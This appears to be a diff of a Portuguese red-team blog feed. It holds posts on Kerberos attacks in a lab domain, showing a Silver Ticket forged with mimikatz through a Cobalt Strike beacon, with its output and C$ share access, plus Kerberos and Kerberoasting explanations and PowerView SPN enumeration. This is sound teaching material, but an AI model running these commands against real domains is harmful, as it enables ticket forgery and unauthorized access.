-&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;beacon&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;mimikatz kerberos::golden /domain:hnr.local /user:admin /sid:S-1-5-21-45967290-1955130809-1078885739 /target:SQL.hnr.local /service:CIFS /rc4:95e93eb10b58109a6b0227d8c821dbdd /ptt
-&lt;span class=&quot;go&quot;&gt;[*] Tasked beacon to run mimikatz's kerberos::golden /domain:hnr.local /user:admin /sid:S-1-5-21-45967290-1955130809-1078885739 /target:SQL.hnr.local /service:CIFS /rc4:95e93eb10b58109a6b0227d8c821dbdd /ptt command
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">beacon&gt;</span><span class="w"> </span>mimikatz kerberos::golden /domain:hnr.local /user:admin /sid:S-1-5-21-45967290-1955130809-1078885739 /target:SQL.hnr.local /service:CIFS /rc4:95e93eb10b58109a6b0227d8c821dbdd /ptt
+<span class="go">[*] Tasked beacon to run mimikatz's kerberos::golden /domain:hnr.local /user:admin /sid:S-1-5-21-45967290-1955130809-1078885739 /target:SQL.hnr.local /service:CIFS /rc4:95e93eb10b58109a6b0227d8c821dbdd /ptt command
 [+] host called home, sent: 998474 bytes
 [+] received output:
 User      : admin
@@ -435,9 +370,9 @@ Groups Id : *513 512 520 518 519
 ServiceKey: 95e93eb10b58109a6b0227d8c821dbdd - rc4_hmac_nt      
 Service   : CIFS
 Target    : SQL.hnr.local
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Lifetime  : 01/03/2020 18:39:26 ;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;27/02/2030 18:39:26 &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; 27/02/2030 18:39:26
-&lt;span class=&quot;gp&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Ticket : &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt; Pass The Ticket &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;
-&lt;span class=&quot;go&quot;&gt;
+</span><span class="gp">Lifetime  : 01/03/2020 18:39:26 ;</span><span class="w"> </span>27/02/2030 18:39:26 <span class="p">;</span> 27/02/2030 18:39:26
+<span class="gp">-&gt;</span><span class="w"> </span>Ticket : <span class="k">**</span> Pass The Ticket <span class="k">**</span>
+<span class="go">
  * PAC generated
  * PAC signed
  * EncTicketPart generated
@@ -445,147 +380,147 @@ Target    : SQL.hnr.local
  * KrbCred generated
 
 Golden ticket for 'admin @ hnr.local' successfully submitted for current session
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</span></code></pre></div></div>
 
-&lt;p&gt;Utilizando a ferramenta klist, podemos confirmar que os tickets injetados permanecem armazenados em cache.&lt;/p&gt;
+<p>Utilizando a ferramenta klist, podemos confirmar que os tickets injetados permanecem armazenados em cache.</p>
 
-&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;beacon&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;shell klist
-&lt;span class=&quot;go&quot;&gt;[*] Tasked beacon to run: klist
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">beacon&gt;</span><span class="w"> </span>shell klist
+<span class="go">[*] Tasked beacon to run: klist
 [+] host called home, sent: 36 bytes
 [+] received output:
 
 Current LogonId is 0:0x51f1d
 
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;0&amp;gt;	Client: jbolsonaro @ HNR.LOCAL
-&lt;span class=&quot;go&quot;&gt;	Server: krbtgt/HNR.LOCAL @ HNR.LOCAL
+</span><span class="gp">#</span>0&gt;	Client: jbolsonaro @ HNR.LOCAL
+<span class="go">	Server: krbtgt/HNR.LOCAL @ HNR.LOCAL
 	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;	Ticket Flags 0x60a10000 -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;forwardable forwarded renewable pre_authent name_canonicalize 
-&lt;span class=&quot;go&quot;&gt;	Start Time: 3/2/2020 13:56:50 (local)
+</span><span class="gp">	Ticket Flags 0x60a10000 -&gt;</span><span class="w"> </span>forwardable forwarded renewable pre_authent name_canonicalize 
+<span class="go">	Start Time: 3/2/2020 13:56:50 (local)
 	End Time:   3/2/2020 23:41:06 (local)
 	Renew Time: 3/8/2020 18:11:06 (local)
 	Session Key Type: AES-256-CTS-HMAC-SHA1-96
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;	Cache Flags: 0x2 -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;DELEGATION 
-&lt;span class=&quot;go&quot;&gt;	Kdc Called: GOKU.hnr.local
+</span><span class="gp">	Cache Flags: 0x2 -&gt;</span><span class="w"> </span>DELEGATION 
+<span class="go">	Kdc Called: GOKU.hnr.local
 
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;#&lt;/span&gt;1&amp;gt;	Client: jbolsonaro @ HNR.LOCAL
-&lt;span class=&quot;go&quot;&gt;	Server: host/sql.hnr.local @ HNR.LOCAL
+</span><span class="gp">#</span>1&gt;	Client: jbolsonaro @ HNR.LOCAL
+<span class="go">	Server: host/sql.hnr.local @ HNR.LOCAL
 	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;	Ticket Flags 0x40a10000 -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;forwardable renewable pre_authent name_canonicalize 
-&lt;span class=&quot;go&quot;&gt;	Start Time: 3/1/2020 18:11:06 (local)
+</span><span class="gp">	Ticket Flags 0x40a10000 -&gt;</span><span class="w"> </span>forwardable renewable pre_authent name_canonicalize 
+<span class="go">	Start Time: 3/1/2020 18:11:06 (local)
 	End Time:   3/2/2020 4:11:06 (local)
 	Renew Time: 3/8/2020 18:11:06 (local)
 	Session Key Type: AES-256-CTS-HMAC-SHA1-96
 	Cache Flags: 0 
 	Kdc Called: GOKU.hnr.local
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</span></code></pre></div></div>
 
-&lt;p&gt;Como pode-se notar, após submeter o Silver Ticket na sessão para o serviço &lt;a href=&quot;https://pt.wikipedia.org/wiki/Server_Message_Block&quot;&gt;CIFS&lt;/a&gt;, o acesso ao compartilhamento foi concedido, demonstrando a perfeita execução do ataque.&lt;/p&gt;
+<p>Como pode-se notar, após submeter o Silver Ticket na sessão para o serviço <a href="https://pt.wikipedia.org/wiki/Server_Message_Block">CIFS</a>, o acesso ao compartilhamento foi concedido, demonstrando a perfeita execução do ataque.</p>
 
-&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;beacon&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;shell &lt;span class=&quot;nb&quot;&gt;dir&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;SQL.hnr.local&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;span class=&quot;gp&quot;&gt;[*] Tasked beacon to run: dir \\SQL.hnr.local\c$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;[+] host called home, sent: 53 bytes
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">beacon&gt;</span><span class="w"> </span>shell <span class="nb">dir</span> <span class="se">\\</span>SQL.hnr.local<span class="se">\c</span><span class="err">$</span>
+<span class="gp">[*] Tasked beacon to run: dir \\SQL.hnr.local\c$</span><span class="w">
+</span><span class="go">[+] host called home, sent: 53 bytes
 [+] received output:
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt; Volume in drive \\SQL.hnr.local\c$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;has no label.
-&lt;span class=&quot;go&quot;&gt; Volume Serial Number is 04AB-790B
+</span><span class="gp"> Volume in drive \\SQL.hnr.local\c$</span><span class="w"> </span>has no label.
+<span class="go"> Volume Serial Number is 04AB-790B
 
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt; Directory of \\SQL.hnr.local\c$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;go&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;01/03/2020  11:09    &amp;lt;DIR&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;          &lt;/span&gt;HNRDOCS
-&lt;span class=&quot;gp&quot;&gt;15/09/2018  04:19    &amp;lt;DIR&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;          &lt;/span&gt;PerfLogs
-&lt;span class=&quot;gp&quot;&gt;12/02/2020  17:07    &amp;lt;DIR&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;          &lt;/span&gt;Program Files
-&lt;span class=&quot;gp&quot;&gt;12/02/2020  16:35    &amp;lt;DIR&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;          &lt;/span&gt;Program Files &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x86&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;gp&quot;&gt;12/02/2020  15:34    &amp;lt;DIR&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;          &lt;/span&gt;SQLServer2017Media
-&lt;span class=&quot;gp&quot;&gt;12/02/2020  15:53    &amp;lt;DIR&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;          &lt;/span&gt;Users
-&lt;span class=&quot;gp&quot;&gt;01/03/2020  18:11    &amp;lt;DIR&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;          &lt;/span&gt;Windows
-&lt;span class=&quot;go&quot;&gt;               0 File(s)              0 bytes
+</span><span class="gp"> Directory of \\SQL.hnr.local\c$</span><span class="w">
+</span><span class="go">
+</span><span class="gp">01/03/2020  11:09    &lt;DIR&gt;</span><span class="w">          </span>HNRDOCS
+<span class="gp">15/09/2018  04:19    &lt;DIR&gt;</span><span class="w">          </span>PerfLogs
+<span class="gp">12/02/2020  17:07    &lt;DIR&gt;</span><span class="w">          </span>Program Files
+<span class="gp">12/02/2020  16:35    &lt;DIR&gt;</span><span class="w">          </span>Program Files <span class="o">(</span>x86<span class="o">)</span>
+<span class="gp">12/02/2020  15:34    &lt;DIR&gt;</span><span class="w">          </span>SQLServer2017Media
+<span class="gp">12/02/2020  15:53    &lt;DIR&gt;</span><span class="w">          </span>Users
+<span class="gp">01/03/2020  18:11    &lt;DIR&gt;</span><span class="w">          </span>Windows
+<span class="go">               0 File(s)              0 bytes
                7 Dir(s)  47.061.692.416 bytes free
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</span></code></pre></div></div>
 
-&lt;p&gt;O intuito dos posts é se fazer entender como funcionam os ataques. As ferramentas apresentadas são apenas meios para que possamos alcançar um objetivo. Espero que tenha conseguido passar com clareza todas as informações necessárias para o entendimento e sanar quaisquer dúvidas. Caso eu tenha pecado em algo, ou alguma informação não teve embasamento necessário para seu entendimento, por favor entre em contato comigo, ficarei extramente feliz em ajudar.&lt;/p&gt;
+<p>O intuito dos posts é se fazer entender como funcionam os ataques. As ferramentas apresentadas são apenas meios para que possamos alcançar um objetivo. Espero que tenha conseguido passar com clareza todas as informações necessárias para o entendimento e sanar quaisquer dúvidas. Caso eu tenha pecado em algo, ou alguma informação não teve embasamento necessário para seu entendimento, por favor entre em contato comigo, ficarei extramente feliz em ajudar.</p>
 
-&lt;p&gt;Até o próximo.!!!&lt;/p&gt;
+<p>Até o próximo.!!!</p>
 
-&lt;h5 id=&quot;referências&quot;&gt;Referências&lt;/h5&gt;
+<h5 id="referências">Referências</h5>
 
-&lt;p&gt;Abusing Microsoft Kerberos: Sorry You Guys Don’t Get It &lt;a href=&quot;https://www.youtube.com/watch?v=lJQn06QLwEw&quot;&gt;https://www.youtube.com/watch?v=lJQn06QLwEw&lt;/a&gt;&lt;/p&gt;</content><author><name>tuxtrack</name></author><category term="KERBEROS" /><category term="ACTIVE DIRECTORY" /><category term="REDTEAM" /><category term="WINDOWS" /><summary type="html">Como mostrado no post anterior, em meio ao processo de autenticação de um usuário/computador em um ambiente Microsoft Active Directory utilizando o protocolo Kerberos, uma troca de informações ocorre para validar a conta em questão.</summary></entry><entry><title type="html">Kerberos &amp;amp; Kerberoast</title><link href="http://localhost:4000/2020/02/13/kerberos101.html" rel="alternate" type="text/html" title="Kerberos &amp;amp; Kerberoast" /><published>2020-02-13T09:55:00-03:00</published><updated>2020-02-13T09:55:00-03:00</updated><id>http://localhost:4000/2020/02/13/kerberos101</id><content type="html" xml:base="http://localhost:4000/2020/02/13/kerberos101.html">&lt;p&gt;O protocolo Kerberos fornece autenticação para o ambiente de computação possibilitando flexibilidade para operar entre diversos sistemas operacionais. Em ambientes Microsoft Windows, o protocolo é instalado como parte do Active Directory Services, ajudando no controle centralizado do gerenciamento de contas de usuários, computadores, grupos, serviços e recursos, desde que a Microsoft o adotou no Windows 2000, abandonando o processo de autenticação que na ocasião era através do &lt;a href=&quot;https://en.wikipedia.org/wiki/NT_LAN_Manager&quot;&gt;NT LAN Manager (NTML) Challenge-Response&lt;/a&gt;.&lt;/p&gt;
+<p>Abusing Microsoft Kerberos: Sorry You Guys Don’t Get It <a href="https://www.youtube.com/watch?v=lJQn06QLwEw">https://www.youtube.com/watch?v=lJQn06QLwEw</a></p>]]></content><author><name>tuxtrack</name></author><category term="KERBEROS" /><category term="ACTIVE DIRECTORY" /><category term="REDTEAM" /><category term="WINDOWS" /><summary type="html"><![CDATA[Como mostrado no post anterior, em meio ao processo de autenticação de um usuário/computador em um ambiente Microsoft Active Directory utilizando o protocolo Kerberos, uma troca de informações ocorre para validar a conta em questão.]]></summary></entry><entry><title type="html">Kerberos &amp;amp; Kerberoast</title><link href="http://localhost:4000/2020/02/13/kerberos101.html" rel="alternate" type="text/html" title="Kerberos &amp;amp; Kerberoast" /><published>2020-02-13T12:55:00+00:00</published><updated>2020-02-13T12:55:00+00:00</updated><id>http://localhost:4000/2020/02/13/kerberos101</id><content type="html" xml:base="http://localhost:4000/2020/02/13/kerberos101.html"><![CDATA[<p>O protocolo Kerberos fornece autenticação para o ambiente de computação possibilitando flexibilidade para operar entre diversos sistemas operacionais. Em ambientes Microsoft Windows, o protocolo é instalado como parte do Active Directory Services, ajudando no controle centralizado do gerenciamento de contas de usuários, computadores, grupos, serviços e recursos, desde que a Microsoft o adotou no Windows 2000, abandonando o processo de autenticação que na ocasião era através do <a href="https://en.wikipedia.org/wiki/NT_LAN_Manager">NT LAN Manager (NTML) Challenge-Response</a>.</p>
 
-&lt;blockquote&gt;
-  &lt;p&gt;Kerberos é um protocolo de autenticação usado para verificar a identidade de um usuário ou host. &lt;a href=&quot;https://docs.microsoft.com/pt-br/windows-server/security/kerberos/kerberos-authentication-overview&quot;&gt;Microsoft&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
+<blockquote>
+  <p>Kerberos é um protocolo de autenticação usado para verificar a identidade de um usuário ou host. <a href="https://docs.microsoft.com/pt-br/windows-server/security/kerberos/kerberos-authentication-overview">Microsoft</a></p>
+</blockquote>
 
-&lt;h3 id=&quot;funcionamento-do-processo-de-autenticação&quot;&gt;Funcionamento do processo de autenticação&lt;/h3&gt;
+<h3 id="funcionamento-do-processo-de-autenticação">Funcionamento do processo de autenticação</h3>
 
-&lt;ul&gt;
-  &lt;li&gt;No momento em que o usuário faz logon utilizando credenciais de um domínio, o Local Security Authority Subsystem Service (LSASS) armazena o hash da sua conta. O LSASS armazena credenciais na memória em nome de usuários com sessões ativas do Windows.&lt;/li&gt;
-&lt;/ul&gt;
+<ul>
+  <li>No momento em que o usuário faz logon utilizando credenciais de um domínio, o Local Security Authority Subsystem Service (LSASS) armazena o hash da sua conta. O LSASS armazena credenciais na memória em nome de usuários com sessões ativas do Windows.</li>
+</ul>
 
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/kb101/01.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/kb101/01.png" alt="" /></p>
 
-&lt;hr /&gt;
+<hr />
 
-&lt;ul&gt;
-  &lt;li&gt;O TGT (Ticket-Granting-Ticket) será requisitado ao KDC (Key Distribution Center) service presente no DC (Domain Controller), utilizando algum dos algoritimos de criptografia (RC4_HMAC, DES_CBC_MD5, 128AES_HMAC, 256AES_HMAC…) baseando-se no &lt;a href=&quot;https://docs.microsoft.com/pt-br/windows-server/identity/ad-ds/active-directory-functional-levels&quot;&gt;Domain Level Function&lt;/a&gt;.&lt;/li&gt;
-&lt;/ul&gt;
+<ul>
+  <li>O TGT (Ticket-Granting-Ticket) será requisitado ao KDC (Key Distribution Center) service presente no DC (Domain Controller), utilizando algum dos algoritimos de criptografia (RC4_HMAC, DES_CBC_MD5, 128AES_HMAC, 256AES_HMAC…) baseando-se no <a href="https://docs.microsoft.com/pt-br/windows-server/identity/ad-ds/active-directory-functional-levels">Domain Level Function</a>.</li>
+</ul>
 
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/kb101/02.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/kb101/02.png" alt="" /></p>
 
-&lt;hr /&gt;
+<hr />
 
-&lt;ul&gt;
-  &lt;li&gt;Ocorrendo a validação da autenticação da conta, o Domain Controller retorna o TGT assinado com o hash da conta de serviço krbtgt (Key Distribution Center Service Account). krbtgt é a conta utilizada para criptografar e assinar todos os tickets do domínio, logo, se o hash da conta é comprometido, um atacante pode forjar tickets (Golden Tickets).&lt;/li&gt;
-&lt;/ul&gt;
+<ul>
+  <li>Ocorrendo a validação da autenticação da conta, o Domain Controller retorna o TGT assinado com o hash da conta de serviço krbtgt (Key Distribution Center Service Account). krbtgt é a conta utilizada para criptografar e assinar todos os tickets do domínio, logo, se o hash da conta é comprometido, um atacante pode forjar tickets (Golden Tickets).</li>
+</ul>
 
-&lt;p&gt;Através do cmdlet &lt;a href=&quot;https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1&quot;&gt;Get-WmiObject&lt;/a&gt; do powershell, podemos obter informações sobre a conta krbtgt utilizando a classe &lt;a href=&quot;https://wutils.com/wmi/root/directory/ldap/ads_account/&quot;&gt;ads_account&lt;/a&gt; presente no NameSpace &lt;a href=&quot;https://wutils.com/wmi/root/directory/ldap/default.html&quot;&gt;ROOT\directory\LDAP&lt;/a&gt;.&lt;/p&gt;
+<p>Através do cmdlet <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1">Get-WmiObject</a> do powershell, podemos obter informações sobre a conta krbtgt utilizando a classe <a href="https://wutils.com/wmi/root/directory/ldap/ads_account/">ads_account</a> presente no NameSpace <a href="https://wutils.com/wmi/root/directory/ldap/default.html">ROOT\directory\LDAP</a>.</p>
 
-&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;PS C:\Users\tuxtrack&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Get-WmiObject &lt;span class=&quot;nt&quot;&gt;-Namespace&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ROOT&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\d&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;irectory&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\L&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;DAP&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Class&lt;/span&gt; ads_account &lt;span class=&quot;nt&quot;&gt;-Filter&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ds_user='krbtgt'&quot;&lt;/span&gt;
-&lt;span class=&quot;go&quot;&gt;
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\tuxtrack&gt;</span><span class="w"> </span>Get-WmiObject <span class="nt">-Namespace</span> <span class="s2">"ROOT</span><span class="se">\d</span><span class="s2">irectory</span><span class="se">\L</span><span class="s2">DAP"</span> <span class="nt">-Class</span> ads_account <span class="nt">-Filter</span> <span class="s2">"ds_user='krbtgt'"</span>
+<span class="go">
 DS_Name                 : krbtgt
 ADSIPath                : LDAP://CN=krbtgt,CN=Users,DC=hnr,DC=local
 DS_description          : {Key Distribution Center Service Account}
 DS_servicePrincipalName : {kadmin/changepw}
 DS_memberOf             : {CN=Denied RODC Password Replication Group,CN=Users,DC=hnr,DC=local}
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</span></code></pre></div></div>
 
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/kb101/03.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/kb101/03.png" alt="" /></p>
 
-&lt;hr /&gt;
+<hr />
 
-&lt;ul&gt;
-  &lt;li&gt;Para que o usuário possa utilizar algum serviço do domínio, o processo de autorização se dá através do envio do TGT ao Domain Controller para a requisição do Service Ticket ou TGS (Ticket-Granting-Service), ex.: MSSqlSvc/SQL.domain.com. Durante esse processo o atacante pode especificar qual criptografia ele suporta &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-configure-encryption-types-allowed-for-kerberos&quot;&gt;(RC4_HMAC, AES256_CTS_HMAC_SHA1_96, etc)&lt;/a&gt;.&lt;/li&gt;
-&lt;/ul&gt;
+<ul>
+  <li>Para que o usuário possa utilizar algum serviço do domínio, o processo de autorização se dá através do envio do TGT ao Domain Controller para a requisição do Service Ticket ou TGS (Ticket-Granting-Service), ex.: MSSqlSvc/SQL.domain.com. Durante esse processo o atacante pode especificar qual criptografia ele suporta <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-configure-encryption-types-allowed-for-kerberos">(RC4_HMAC, AES256_CTS_HMAC_SHA1_96, etc)</a>.</li>
+</ul>
 
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/kb101/04.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/kb101/04.png" alt="" /></p>
 
-&lt;hr /&gt;
+<hr />
 
-&lt;ul&gt;
-  &lt;li&gt;O Domain Controller retorna o Service Ticket (TGS) correspondente ao serviço solicitado, após identificar qual conta de usuário/computador possui o serviço solicitado. O ticket retornado é criptografado com o hash da conta de usuário/computador correspondente ao serviço.&lt;/li&gt;
-&lt;/ul&gt;
+<ul>
+  <li>O Domain Controller retorna o Service Ticket (TGS) correspondente ao serviço solicitado, após identificar qual conta de usuário/computador possui o serviço solicitado. O ticket retornado é criptografado com o hash da conta de usuário/computador correspondente ao serviço.</li>
+</ul>
 
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/kb101/05.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/kb101/05.png" alt="" /></p>
 
-&lt;hr /&gt;
+<hr />
 
-&lt;ul&gt;
-  &lt;li&gt;O Service Ticket (TGS) é apresentado ao server que armazena o serviço solicitado, o servidor descriptografa o hash utilizando seu próprio hash (Hash esse que foi utilizado pelo DC para criptografar o TGS no passo anterior) e o acesso ao serviço é concedido.&lt;/li&gt;
-&lt;/ul&gt;
+<ul>
+  <li>O Service Ticket (TGS) é apresentado ao server que armazena o serviço solicitado, o servidor descriptografa o hash utilizando seu próprio hash (Hash esse que foi utilizado pelo DC para criptografar o TGS no passo anterior) e o acesso ao serviço é concedido.</li>
+</ul>
 
-&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/kb101/06.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/kb101/06.png" alt="" /></p>
 
-&lt;hr /&gt;
+<hr />
 
-&lt;h3 id=&quot;kerberoast&quot;&gt;Kerberoast&lt;/h3&gt;
+<h3 id="kerberoast">Kerberoast</h3>
 
-&lt;p&gt;Kerberoast é o nome dado ao ataque no processo de assinatura de um Service Ticket. TGS’s tickets são criptografados com hash NTLM da conta de domínio utilizada como conta de serviço que utilize o kerberos para autenticação, no caso abaixo, a conta sqlserver para o SPN MSSQLSvc/SQL.hnr.local (TGS-REP). O acesso ao serviço não é necessário para se ter acesso ao ticket de serviço, já que como mostrado anteriormente, para requisitar um TGS, o atacante necessita apenas do TGT (TGS-REQ).&lt;/p&gt;
+<p>Kerberoast é o nome dado ao ataque no processo de assinatura de um Service Ticket. TGS’s tickets são criptografados com hash NTLM da conta de domínio utilizada como conta de serviço que utilize o kerberos para autenticação, no caso abaixo, a conta sqlserver para o SPN MSSQLSvc/SQL.hnr.local (TGS-REP). O acesso ao serviço não é necessário para se ter acesso ao ticket de serviço, já que como mostrado anteriormente, para requisitar um TGS, o atacante necessita apenas do TGT (TGS-REQ).</p>
 
-&lt;blockquote&gt;
-  &lt;p&gt;SPN - A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. This allows a client application to request that the service authenticate an account even if the client does not have the account name. &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names&quot;&gt;MSDN&lt;/a&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
+<blockquote>
+  <p>SPN - A service principal name (SPN) is a unique identifier of a service instance. SPNs are used by Kerberos authentication to associate a service instance with a service logon account. This allows a client application to request that the service authenticate an account even if the client does not have the account name. <a href="https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names">MSDN</a></p>
+</blockquote>
 
-&lt;p&gt;É necessário ao atacante listar todos os SPN’s presentes no domínio. Uma das formas de enumerá-los é utilizando o módulo Get-NetUser do &lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1&quot;&gt;PowerView&lt;/a&gt;, projeto que reúne diversos recursos de enumeração em ambientes Microsoft Active Directory, ou poderíamos utilizar a ferramenta &lt;a href=&quot;https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v%3Dws.11)&quot;&gt;setspn.exe&lt;/a&gt; seguindo do argumento “-L ServerName”, presente por padrão nos sistemas operacionais Microsoft Windows.&lt;/p&gt;
+<p>É necessário ao atacante listar todos os SPN’s presentes no domínio. Uma das formas de enumerá-los é utilizando o módulo Get-NetUser do <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>, projeto que reúne diversos recursos de enumeração em ambientes Microsoft Active Directory, ou poderíamos utilizar a ferramenta <a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v%3Dws.11)">setspn.exe</a> seguindo do argumento “-L ServerName”, presente por padrão nos sistemas operacionais Microsoft Windows.</p>
 
-&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;PS C:\Users\charris\Desktop&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Get-NetUser &lt;span class=&quot;nt&quot;&gt;-SPN&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Domain&lt;/span&gt; hnr.local                                                                                                                                      
-&lt;span class=&quot;go&quot;&gt;
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\charris\Desktop&gt;</span><span class="w"> </span>Get-NetUser <span class="nt">-SPN</span> <span class="nt">-Domain</span> hnr.local                                                                                                                                      
+<span class="go">
 logoncount                    : 0
 badpasswordtime               : 12/31/1600 10:00:00 PM
 description                   : Key Distribution Center Service Account
